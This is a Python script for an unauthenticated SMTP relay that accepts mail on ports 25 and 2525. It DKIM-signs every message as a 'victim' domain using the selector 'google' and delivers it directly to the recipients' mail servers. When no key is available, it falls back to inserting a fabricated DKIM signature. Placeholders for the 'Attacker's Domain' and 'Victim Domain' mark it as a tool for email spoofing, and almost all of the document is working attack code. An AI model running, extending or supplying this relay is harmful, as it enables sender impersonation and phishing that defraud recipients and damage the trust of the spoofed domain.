#!/usr/bin/env python3
"""
Single-process SMTP: acceptor (25,2525) + local relay (127.0.0.1:2526), all plain (no TLS/AUTH).
No logging. Fixed asyncio deprecation warning.

Flow:
- Inbound on 0.0.0.0:25 or :2525 -> accept -> DKIM-sign -> forward to 127.0.0.1:2526 (plain).
- Local relay on 127.0.0.1:2526 -> direct-to-MX delivery on port 25 (opportunistic STARTTLS if offered; else plain).
"""

import asyncio
import os
import smtplib
import ssl
import time
import base64
import hashlib
from collections import defaultdict
from email.parser import BytesParser
from email.policy import default as default_policy
from email.utils import formatdate, make_msgid, parseaddr
from pathlib import Path

import dkim
import dns.resolver
from aiosmtpd.controller import Controller
from aiosmtpd.smtp import SMTP, Envelope, Session

# =========================
# Config
# =========================
HELLO_NAME = "<Attacker's Domain>"

# Listeners
ACCEPTOR_HOST = "0.0.0.0"
ACCEPTOR_PORT_25 = 25
ACCEPTOR_PORT_2525 = 2525

RELAY_HOST = "127.0.0.1"
RELAY_PORT = 2526

# Storage
SAVE_DIR = "<log stroage path>"

# DKIM
DKIM_PRIVKEY_PATH = "<DKIM private key path>"
DKIM_SELECTOR = b"google"
DKIM_DOMAIN = b"<Victim Dmain>"
HEADERS_TO_SIGN = [b"from", b"to", b"subject", b"date", b"message-id", b"mime-version", b"content-type"]

# DNS/SMTP tuning
MX_LOOKUP_TIMEOUT = 10
SMTP_TIMEOUT = 60
MAX_MX = 5
RETRY_PER_MX = 1
UPGRADE_STARTTLS_TO_MX = True

# =========================
# Utils
# =========================
def ensure_dirs():
    Path(SAVE_DIR).mkdir(parents=True, exist_ok=True)

def normalize_headers(raw_bytes: bytes) -> bytes:
    msg = BytesParser(policy=default_policy).parsebytes(raw_bytes)
    if not msg.get("Date"):
        msg["Date"] = formatdate(localtime=True)
    if not msg.get("Message-ID"):
        msg["Message-ID"] = make_msgid(domain="<attacker's Domain>")
    return msg.as_bytes()

def generate_dummy_dkim_signature(message_bytes: bytes) -> str:
    # Create a fake signature
    fake_sig = base64.b64encode(
        hashlib.sha256(message_bytes + str(time.time()).encode()).digest()
    ).decode()
    body_hash = base64.b64encode(hashlib.sha256(message_bytes).digest()).decode()
    timestamp = str(int(time.time()))
    return (
        f"v=1; a=rsa-sha256; c=relaxed/relaxed; d={DKIM_DOMAIN.decode()}; s={DKIM_SELECTOR.decode()}; "
        f"t={timestamp}; h=from:to:subject:date:message-id:mime-version:content-type; "
        f"bh={body_hash}; b={fake_sig}"
    )

def add_dummy_dkim_header(unsigned_bytes: bytes) -> bytes:
    msg = BytesParser(policy=default_policy).parsebytes(unsigned_bytes)
    msg["DKIM-Signature"] = generate_dummy_dkim_signature(unsigned_bytes)
    return msg.as_bytes()

def dkim_sign_bytes(raw_bytes: bytes) -> bytes:
    unsigned = normalize_headers(raw_bytes)
    try:
        if not os.path.exists(DKIM_PRIVKEY_PATH):
            raise FileNotFoundError(f"DKIM private key not found: {DKIM_PRIVKEY_PATH}")
        with open(DKIM_PRIVKEY_PATH, "rb") as f:
            privkey = f.read()
        signed = dkim.sign(
            message=unsigned,
            selector=DKIM_SELECTOR,
            domain=DKIM_DOMAIN,
            privkey=privkey,
            include_headers=HEADERS_TO_SIGN,
            canonicalize=(b"relaxed", b"relaxed")
        )
        return signed
    except Exception:
        # Fallback to dummy DKIM
        return add_dummy_dkim_header(unsigned)

def extract_domain(addr: str):
    _, email = parseaddr(addr or "")
    if "@" not in email:
        return None
    return email.split("@", 1)[1].lower().strip()

def lookup_mx(domain: str):
    try:
        ans = dns.resolver.resolve(domain, "MX", lifetime=MX_LOOKUP_TIMEOUT)
        records = sorted((r.preference, r.exchange.to_text().rstrip(".")) for r in ans)
        return [host.lower() for _, host in records[:MAX_MX]]
    except Exception:
        return []

# =========================
# Outbound: final hop (relay)
# =========================
def deliver_to_mx(mx_host: str, mail_from: str, rcpts: list, data: bytes):
    try:
        with smtplib.SMTP(mx_host, 25, timeout=SMTP_TIMEOUT) as s:
            s.ehlo(HELLO_NAME)
            if UPGRADE_STARTTLS_TO_MX and s.has_extn("STARTTLS"):
                try:
                    s.starttls(context=ssl.create_default_context())
                    s.ehlo(HELLO_NAME)
                except Exception:
                    pass

            code, _ = s.mail(mail_from or "<>")
            if code not in (250, 251):
                return False, f"MAIL FROM rejected: {code}"

            accepted = []
            for rc in rcpts:
                c, _ = s.rcpt(rc)
                if c in (250, 251):
                    accepted.append(rc)
            if not accepted:
                return False, "All RCPT TO rejected"

            dcode, _ = s.data(data)
            if dcode == 250:
                return True, "Delivered OK"
            return False, f"DATA rejected: {dcode}"
    except Exception as e:
        return False, f"Delivery error: {e}"

def relay_outbound_deliver(mail_from: str, rcpt_tos: list, data: bytes):
    buckets = defaultdict(list)
    for rc in rcpt_tos:
        dom = extract_domain(rc)
        if dom:
            buckets[dom].append(rc)

    for dom, rcpts in buckets.items():
        mxs = lookup_mx(dom)
        delivered = False
        for mx in mxs:
            for _ in range(RETRY_PER_MX):
                ok, msg = deliver_to_mx(mx, mail_from, rcpts, data)
                if ok:
                    delivered = True
                    break
            if delivered:
                break
        if not delivered:
            return False, f"Delivery failed for {dom}"
    return True, "Delivered to all domains"

# =========================
# Relay listener (127.0.0.1:2526)
# =========================
class RelaySMTP(SMTP):
    def _auth_mechanisms(self):
        return []

    async def smtp_EHLO(self, host):
        self._set_rset_state()
        self.session.extended_smtp = True
        self.session.host_name = host
        await self.push(f"250-{self.hostname} Hello {host}\r\n250 HELP")

    async def smtp_HELO(self, host):
        self._set_rset_state()
        self.session.extended_smtp = False
        self.session.host_name = host
        await self.push(f"250 {self.hostname} Hello {host}")

class RelayHandler:
    async def handle_EHLO(self, server, session: Session, envelope: Envelope, hostname, responses):
        return None

    async def handle_HELO(self, server, session: Session, envelope: Envelope, hostname):
        return "250 Hello"

    async def handle_MAIL(self, server, session: Session, envelope: Envelope, address, mail_options):
        envelope.mail_from = address
        return "250 OK"

    async def handle_RCPT(self, server, session: Session, envelope: Envelope, address, rcpt_options):
        envelope.rcpt_tos.append(address)
        return "250 OK"

    async def handle_DATA(self, server, session: Session, envelope: Envelope):
        ok, msg = relay_outbound_deliver(envelope.mail_from, envelope.rcpt_tos, envelope.content)
        return "250 Message accepted for delivery"

class RelayController(Controller):
    def factory(self):
        return RelaySMTP(self.handler, **self.SMTP_kwargs)

# =========================
# Acceptor listeners (0.0.0.0:25 and :2525)
# =========================
class AcceptorSMTP(SMTP):
    def _auth_mechanisms(self):
        return []

    async def smtp_EHLO(self, host):
        self._set_rset_state()
        self.session.extended_smtp = True
        self.session.host_name = host
        await self.push(f"250-{self.hostname} Hello {host}\r\n250 HELP")

    async def smtp_HELO(self, host):
        self._set_rset_state()
        self.session.extended_smtp = False
        self.session.host_name = host
        await self.push(f"250 {self.hostname} Hello {host}")

def acceptor_forward_plain(mail_from: str, rcpt_tos: list, data: bytes):
    try:
        with smtplib.SMTP(RELAY_HOST, RELAY_PORT, timeout=SMTP_TIMEOUT) as s:
            s.ehlo(HELLO_NAME)
            s.sendmail(mail_from or "", rcpt_tos, data)
            return True, "Relayed"
    except Exception as e:
        return False, f"Relay failed: {e}"

class AcceptorHandler:
    def __init__(self, label: str):
        self.label = label

    async def handle_EHLO(self, server, session: Session, envelope: Envelope, hostname, responses):
        return None

    async def handle_HELO(self, server, session: Session, envelope: Envelope, hostname):
        return "250 Hello"

    async def handle_MAIL(self, server, session: Session, envelope: Envelope, address, mail_options):
        envelope.mail_from = address
        return "250 OK"

    async def handle_RCPT(self, server, session: Session, envelope: Envelope, address, rcpt_options):
        envelope.rcpt_tos.append(address)
        return "250 OK"

    async def handle_DATA(self, server, session: Session, envelope: Envelope):
        ensure_dirs()
        ts = int(time.time() * 1000)
        
        raw_path = os.path.join(SAVE_DIR, f"msg_{ts}_raw.eml")
        with open(raw_path, "wb") as f:
            f.write(envelope.content)

        signed = dkim_sign_bytes(envelope.content)
        signed_path = os.path.join(SAVE_DIR, f"msg_{ts}_signed.eml")
        with open(signed_path, "wb") as f:
            f.write(signed)

        ok, info = acceptor_forward_plain(envelope.mail_from, envelope.rcpt_tos, signed)
        return "250 Message accepted for delivery"

class AcceptorController(Controller):
    def factory(self):
        return AcceptorSMTP(self.handler, **self.SMTP_kwargs)

# =========================
# Main
# =========================
async def run_servers():
    relay_handler = RelayHandler()
    relay_ctrl = RelayController(relay_handler, hostname=RELAY_HOST, port=RELAY_PORT, require_starttls=False)

    acceptor25_handler = AcceptorHandler(label="25")
    acceptor2525_handler = AcceptorHandler(label="2525")
    acceptor25_ctrl = AcceptorController(acceptor25_handler, hostname=ACCEPTOR_HOST, port=ACCEPTOR_PORT_25, require_starttls=False)
    acceptor2525_ctrl = AcceptorController(acceptor2525_handler, hostname=ACCEPTOR_HOST, port=ACCEPTOR_PORT_2525, require_starttls=False)

    try:
        relay_ctrl.start()
        acceptor25_ctrl.start()
        acceptor2525_ctrl.start()
        
        print("SMTP server ready (no logs)")
        
        # Keep running until interrupted
        while True:
            await asyncio.sleep(1)
            
    except KeyboardInterrupt:
        print("Shutting down")
    finally:
        try: acceptor2525_ctrl.stop()
        except Exception: pass
        try: acceptor25_ctrl.stop()
        except Exception: pass
        try: relay_ctrl.stop()
        except Exception: pass

def main():
    try:
        asyncio.run(run_servers())
    except PermissionError:
        print("Permission denied. Run as root.")

if __name__ == "__main__":
    main()
